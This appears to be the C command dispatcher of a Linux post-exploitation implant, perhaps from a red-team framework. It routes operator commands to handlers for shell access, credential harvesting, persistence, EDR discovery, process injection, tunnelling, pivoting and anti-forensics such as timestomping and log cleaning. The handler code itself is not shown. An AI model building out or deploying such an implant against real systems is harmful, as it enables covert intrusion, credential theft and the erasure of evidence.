#include "commander.h"
#include "crt.h"
#include "tasks_fs.h"
#include "tasks_proc.h"
#include "tasks_linux.h"
#include "tasks_async.h"
#include "tasks_net.h"
#include "tasks_opsec.h"
#include "tasks_pivot.h"
#include "pivot.h"
#include "elf_bof.h"

static int cmd_error(mp_writer_t* w, const char* msg);

int handle_command(uint32_t code, uint32_t cmd_id,
                   const uint8_t* data, uint32_t data_len,
                   mp_writer_t* response) {
    switch (code) {
        // ── Filesystem commands ──
        case COMMAND_PWD:
            return task_pwd(response);
        case COMMAND_CD:
            return task_cd(data, data_len, response);
        case COMMAND_CAT:
            return task_cat(data, data_len, response);
        case COMMAND_LS:
            return task_ls(data, data_len, response);
        case COMMAND_CP:
            return task_cp(data, data_len, response);
        case COMMAND_MV:
            return task_mv(data, data_len, response);
        case COMMAND_MKDIR:
            return task_mkdir(data, data_len, response);
        case COMMAND_RM:
            return task_rm(data, data_len, response);

        // ── Process commands ──
        case COMMAND_PS:
            return task_ps(response);
        case COMMAND_KILL:
            return task_kill(data, data_len, response);
        case COMMAND_SHELL:
            return task_shell(data, data_len, response);

        // ── Linux-specific ──
        case COMMAND_GETUID:
            return task_getuid(response);
        case COMMAND_ENV:
            return task_env(response);
        case COMMAND_NETSTAT:
            return task_netstat(response);
        case COMMAND_MOUNTS:
            return task_mounts(response);
        case COMMAND_EDR:
            return task_edr(response);
        case COMMAND_CREDS:
            return task_creds(data, data_len, response);
        case COMMAND_PERSIST:
            return task_persist(data, data_len, response);
        case COMMAND_CONTAINER:
            return task_container(data, data_len, response);

        // ── OPSEC commands ──
        case COMMAND_MASQUERADE:
            return task_masquerade(data, data_len, response);
        case COMMAND_TIMESTOMP:
            return task_timestomp(data, data_len, response);
        case COMMAND_CLEANLOG:
            return task_cleanlog(response);
        case COMMAND_INJECT:
            return task_inject(data, data_len, response);
        case COMMAND_MIGRATE:
            return task_migrate(response);

        // ── Control ──
        case COMMAND_EXIT:
            return -99;

        // ── Async/Job commands ──
        case COMMAND_DOWNLOAD:
            return task_download(data, data_len, response);
        case COMMAND_UPLOAD:
            return task_upload(data, data_len, response);
        case COMMAND_RUN:
            return task_run(data, data_len, response);
        case COMMAND_JOB_LIST:
            return task_job_list(response);
        case COMMAND_JOB_KILL:
            return task_job_kill(data, data_len, response);

        // ── Network commands ──
        case COMMAND_TUNNEL_START:
            return task_tunnel_start(data, data_len, response);
        case COMMAND_TUNNEL_WRITE:
            return task_tunnel_write(data, data_len, response);
        case COMMAND_TUNNEL_STOP:
            return task_tunnel_stop(data, data_len, response);
        case COMMAND_TUNNEL_PAUSE:
            return task_tunnel_pause(data, data_len, response);
        case COMMAND_TUNNEL_RESUME:
            return task_tunnel_resume(data, data_len, response);
        case COMMAND_TERMINAL_START:
            return task_terminal_start(data, data_len, response);
        case COMMAND_TERMINAL_STOP:
            return task_terminal_stop(data, data_len, response);

        // ── BOF commands ──
        case COMMAND_EXEC_BOF:
            return task_exec_bof(cmd_id, data, data_len, response);
        case COMMAND_EXEC_BOF_ASYNC:
            return task_exec_bof_async(cmd_id, data, data_len, response);

        // ── Pivot commands ──
        case COMMAND_LINK:
            return task_link_with_id(cmd_id, data, data_len, response);
        case COMMAND_UNLINK:
            return task_unlink(data, data_len, response);
        case COMMAND_PIVOT_EXEC:
            return task_pivot_exec(data, data_len, response);

        default:
            return cmd_error(response, "Unknown command");
    }
}

static int cmd_error(mp_writer_t* w, const char* msg) {
    mp_write_map(w, 1);
    mp_write_kv_str(w, "error", msg);
    return 0;
}
